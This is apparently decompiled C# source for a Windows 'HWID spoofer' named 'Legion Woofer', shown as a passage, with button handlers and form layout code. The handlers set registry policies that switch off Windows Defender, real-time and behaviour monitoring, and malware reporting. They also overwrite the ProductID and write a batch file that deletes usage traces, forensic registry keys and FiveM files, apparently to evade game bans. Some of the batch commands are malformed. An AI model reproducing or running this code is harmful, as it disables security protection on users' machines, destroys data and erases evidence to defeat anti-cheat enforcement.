      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", (object) 14, RegistryValueKind.DWord);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("GPU Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Scheduling Category", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("SFIO Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("GPU Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Scheduling Category", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("SFIO Priority", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", (object) 0);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", (object) 0);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", (object) 1);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", (object) "1", RegistryValueKind.DWord);
      Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", (object) "1", RegistryValueKind.DWord);
      Spoofer.HWIDclick();
      string str = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
      using (StreamWriter streamWriter = new StreamWriter(str))
      {
        streamWriter.WriteLine("echo off");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("taskkill /f /im Steam.exe /t");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("set hostspath=%windir%\\System32\\drivers\\etc\\hosts");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\steam_api64.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\DigitalEntitlements");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
        streamWriter.WriteLine("cls");
        streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc LeanV2");
        streamWriter.WriteLine("cls");
      }
      Process.Start(str).WaitForExit();
      System.IO.File.Delete(str);
      int num = (int) MessageBox.Show("Spoofed Windows Info!", "Legion Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    public static string CurrentProductID()
    {
      string name1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
      string name2 = "ProductID";
      return ((RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(name1) ?? throw new KeyNotFoundException("Key Not Found: " + name1)).GetValue(name2) ?? throw new IndexOutOfRangeException("Index Not Found: " + name2)).ToString();
    }

    public static void luLKEfzx4M()
    {
      string str = Spoofer.GenerateString(5) + "-" + Spoofer.GenerateString(5) + "-" + Spoofer.GenerateString(5) + "-" + Spoofer.GenerateString(5);
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
      registryKey.SetValue("ProductID", (object) str);
      registryKey.Close();
    }

    private void guna2Button6_Click(object sender, EventArgs e)
    {
      string str = "F52CD-0F5E1-B73F8-1B935";
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
      registryKey.SetValue("ProductID", (object) str);
      registryKey.Close();
      int num = (int) MessageBox.Show("PrID Changed To: " + Spoofer.CurrentProductID(), "Legion Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    public static string GenerateString(int size)
    {
      char[] chArray = new char[size];
      for (int index = 0; index < size; ++index)
        chArray[index] = "ABCDEF0123456789"[Spoofer.random.Next("ABCDEF0123456789".Length)];
      return new string(chArray);
    }

    private void guna2Button5_Click(object sender, EventArgs e)
    {
      Spoofer.cvxOUtsw4Z();
      int num = (int) MessageBox.Show("Spoofed PC Name", "Legion Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Spoofer));
      this.label1 = new Label();
      this.label6 = new Label();
      this.guna2Button1 = new Guna2Button();
      this.guna2Button2 = new Guna2Button();
      this.guna2Button3 = new Guna2Button();
      this.guna2Button4 = new Guna2Button();
      this.guna2Button5 = new Guna2Button();
      this.guna2Button6 = new Guna2Button();
      this.guna2Button7 = new Guna2Button();
      this.guna2Button8 = new Guna2Button();
      this.guna2Button9 = new Guna2Button();
      this.guna2PictureBox1 = new Guna2PictureBox();
      ((ISupportInitialize) this.guna2PictureBox1).BeginInit();
      this.SuspendLayout();
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Segoe UI Black", 15.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.label1.ForeColor = System.Drawing.Color.White;
      this.label1.Location = new Point(76, 19);
      this.label1.Name = "label1";
      this.label1.Size = new Size(94, 30);
      this.label1.TabIndex = 11;
      this.label1.Text = nameof (Spoofer);
      this.label6.AutoSize = true;
      this.label6.Font = new Font("Segoe UI Black", 5.75f, FontStyle.Bold);
      this.label6.ForeColor = System.Drawing.Color.GreenYellow;
      this.label6.Location = new Point(85, 49);
      this.label6.Name = "label6";
      this.label6.Size = new Size(70, 11);
      this.label6.TabIndex = 20;
      this.label6.Text = "Hardware Cleaner";
      this.guna2Button1.AutoRoundedCorners = true;
      this.guna2Button1.BorderColor = System.Drawing.Color.GreenYellow;
      this.guna2Button1.BorderRadius = 13;
      this.guna2Button1.BorderThickness = 1;
      this.guna2Button1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
      this.guna2Button1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
      this.guna2Button1.FillColor = System.Drawing.Color.Transparent;
      this.guna2Button1.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold);
      this.guna2Button1.ForeColor = System.Drawing.Color.GreenYellow;
      this.guna2Button1.Location = new Point(42, 139);
      this.guna2Button1.Name = "guna2Button1";
      this.guna2Button1.Size = new Size(128, 29);
      this.guna2Button1.TabIndex = 21;
      ((Control) this.guna2Button1).Text = "Spoof Serial";
      this.guna2Button1.Click += new EventHandler(this.guna2Button1_Click);
      this.guna2Button2.AutoRoundedCorners = true;
      this.guna2Button2.BorderColor = System.Drawing.Color.GreenYellow;
      this.guna2Button2.BorderRadius = 13;
      this.guna2Button2.BorderThickness = 1;
      this.guna2Button2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button2.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
      this.guna2Button2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
      this.guna2Button2.FillColor = System.Drawing.Color.Transparent;
      this.guna2Button2.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold);
      this.guna2Button2.ForeColor = System.Drawing.Color.GreenYellow;
      this.guna2Button2.Location = new Point(42, 185);
      this.guna2Button2.Name = "guna2Button2";
      this.guna2Button2.Size = new Size(128, 29);
      this.guna2Button2.TabIndex = 22;
      ((Control) this.guna2Button2).Text = "Spoof Mac";
      this.guna2Button2.Click += new EventHandler(this.guna2Button2_Click);
      this.guna2Button3.AutoRoundedCorners = true;
      this.guna2Button3.BorderColor = System.Drawing.Color.GreenYellow;
      this.guna2Button3.BorderRadius = 13;
      this.guna2Button3.BorderThickness = 1;
      this.guna2Button3.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button3.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button3.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
      this.guna2Button3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
      this.guna2Button3.FillColor = System.Drawing.Color.Transparent;
      this.guna2Button3.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold);
      this.guna2Button3.ForeColor = System.Drawing.Color.GreenYellow;
      this.guna2Button3.Location = new Point(42, 230);
      this.guna2Button3.Name = "guna2Button3";
      this.guna2Button3.Size = new Size(128, 29);
      this.guna2Button3.TabIndex = 23;
      ((Control) this.guna2Button3).Text = "Spoof Disk";
      this.guna2Button3.Click += new EventHandler(this.guna2Button3_Click);
      this.guna2Button4.AutoRoundedCorners = true;
      this.guna2Button4.BorderColor = System.Drawing.Color.GreenYellow;
      this.guna2Button4.BorderRadius = 13;
      this.guna2Button4.BorderThickness = 1;
      this.guna2Button4.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button4.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button4.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
      this.guna2Button4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
      this.guna2Button4.FillColor = System.Drawing.Color.Transparent;
      this.guna2Button4.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold);
      this.guna2Button4.ForeColor = System.Drawing.Color.GreenYellow;
      this.guna2Button4.Location = new Point(317, 230);
      this.guna2Button4.Name = "guna2Button4";
      this.guna2Button4.Size = new Size(128, 29);
      this.guna2Button4.TabIndex = 24;
      ((Control) this.guna2Button4).Text = "Spoof Logs";
      this.guna2Button4.Click += new EventHandler(this.guna2Button4_Click_1);
      this.guna2Button5.AutoRoundedCorners = true;
      this.guna2Button5.BorderColor = System.Drawing.Color.GreenYellow;
      this.guna2Button5.BorderRadius = 13;
      this.guna2Button5.BorderThickness = 1;
      this.guna2Button5.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button5.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button5.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
      this.guna2Button5.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
      this.guna2Button5.FillColor = System.Drawing.Color.Transparent;
      this.guna2Button5.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold);
      this.guna2Button5.ForeColor = System.Drawing.Color.GreenYellow;
      this.guna2Button5.Location = new Point(317, 185);
      this.guna2Button5.Name = "guna2Button5";
      this.guna2Button5.Size = new Size(128, 29);
      this.guna2Button5.TabIndex = 25;
      ((Control) this.guna2Button5).Text = "Spoof PC Name";
      this.guna2Button5.Click += new EventHandler(this.guna2Button5_Click);
      this.guna2Button6.AutoRoundedCorners = true;
      this.guna2Button6.BorderColor = System.Drawing.Color.GreenYellow;
      this.guna2Button6.BorderRadius = 13;
      this.guna2Button6.BorderThickness = 1;
      this.guna2Button6.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button6.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button6.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
      this.guna2Button6.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
      this.guna2Button6.FillColor = System.Drawing.Color.Transparent;
      this.guna2Button6.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold);
      this.guna2Button6.ForeColor = System.Drawing.Color.GreenYellow;
      this.guna2Button6.Location = new Point(317, 139);
      this.guna2Button6.Name = "guna2Button6";
      this.guna2Button6.Size = new Size(128, 29);
      this.guna2Button6.TabIndex = 26;
      ((Control) this.guna2Button6).Text = "Spoof ID";
      this.guna2Button6.Click += new EventHandler(this.guna2Button6_Click);
      this.guna2Button7.AutoRoundedCorners = true;
      this.guna2Button7.BorderColor = System.Drawing.Color.GreenYellow;
      this.guna2Button7.BorderRadius = 13;
      this.guna2Button7.BorderThickness = 1;
      this.guna2Button7.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button7.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button7.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
      this.guna2Button7.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
      this.guna2Button7.FillColor = System.Drawing.Color.Transparent;
      this.guna2Button7.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold);
      this.guna2Button7.ForeColor = System.Drawing.Color.GreenYellow;
      this.guna2Button7.Location = new Point(317, 91);
      this.guna2Button7.Name = "guna2Button7";
      this.guna2Button7.Size = new Size(128, 29);
      this.guna2Button7.TabIndex = 27;
      ((Control) this.guna2Button7).Text = "Spoof Info";
      this.guna2Button7.Click += new EventHandler(this.guna2Button7_Click);
      this.guna2Button8.AutoRoundedCorners = true;
      this.guna2Button8.BorderColor = System.Drawing.Color.GreenYellow;
      this.guna2Button8.BorderRadius = 13;
      this.guna2Button8.BorderThickness = 1;
      this.guna2Button8.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button8.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button8.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
      this.guna2Button8.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
      this.guna2Button8.FillColor = System.Drawing.Color.Transparent;
      this.guna2Button8.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold);
      this.guna2Button8.ForeColor = System.Drawing.Color.GreenYellow;
      this.guna2Button8.Location = new Point(42, 281);
      this.guna2Button8.Name = "guna2Button8";
      this.guna2Button8.Size = new Size(403, 29);
      this.guna2Button8.TabIndex = 28;
      ((Control) this.guna2Button8).Text = "Spoof ALL";
      this.guna2Button8.Click += new EventHandler(this.guna2Button8_Click);
      this.guna2Button9.AutoRoundedCorners = true;
      this.guna2Button9.BorderColor = System.Drawing.Color.GreenYellow;
      this.guna2Button9.BorderRadius = 13;
      this.guna2Button9.BorderThickness = 1;
      this.guna2Button9.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button9.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button9.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
      this.guna2Button9.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
      this.guna2Button9.FillColor = System.Drawing.Color.Transparent;
      this.guna2Button9.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold);
      this.guna2Button9.ForeColor = System.Drawing.Color.GreenYellow;
      this.guna2Button9.Location = new Point(42, 91);
      this.guna2Button9.Name = "guna2Button9";
      this.guna2Button9.Size = new Size(128, 29);
      this.guna2Button9.TabIndex = 29;
      ((Control) this.guna2Button9).Text = "Spoof Hwid";
      this.guna2Button9.Click += new EventHandler(this.guna2Button9_Click);
      this.guna2PictureBox1.FillColor = System.Drawing.Color.Transparent;
      this.guna2PictureBox1.Image = (Image) componentResourceManager.GetObject("guna2PictureBox1.Image");
      this.guna2PictureBox1.ImageRotate = 0.0f;
      this.guna2PictureBox1.Location = new Point(33, 19);
      this.guna2PictureBox1.Name = "guna2PictureBox1";
      this.guna2PictureBox1.Size = new Size(46, 41);
      this.guna2PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
      this.guna2PictureBox1.TabIndex = 30;
      this.guna2PictureBox1.TabStop = false;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = System.Drawing.Color.Transparent;
      this.Controls.Add((Control) this.guna2PictureBox1);
      this.Controls.Add((Control) this.guna2Button9);
      this.Controls.Add((Control) this.guna2Button8);
      this.Controls.Add((Control) this.guna2Button7);
      this.Controls.Add((Control) this.guna2Button6);
      this.Controls.Add((Control) this.guna2Button5);
